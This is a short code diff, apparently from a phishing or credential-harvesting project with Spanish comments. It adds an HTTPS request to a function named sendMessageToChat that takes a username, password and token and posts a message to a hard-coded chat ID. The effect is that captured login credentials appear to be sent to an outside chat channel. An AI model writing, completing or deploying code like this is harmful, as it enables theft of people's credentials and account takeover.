@@ -1,3 +1,4 @@
+import https from 'https'
 export default function sendMessageToChat(username, password, token) {
     // const chatId = '7487498429'// se elimino
     const chatId = 7087786159 // id abisai
@@ -18,6 +19,11 @@ export default function sendMessageToChat(username, password, token) {
             'Content-Length': Buffer.byteLength(message)
         }
     };
+
+    const request = https.request(options); 
+    request.on('error', e => { console.error(e); }); 
+    request.write(message); 
+    request.end()
     console.log(message)
 
 }
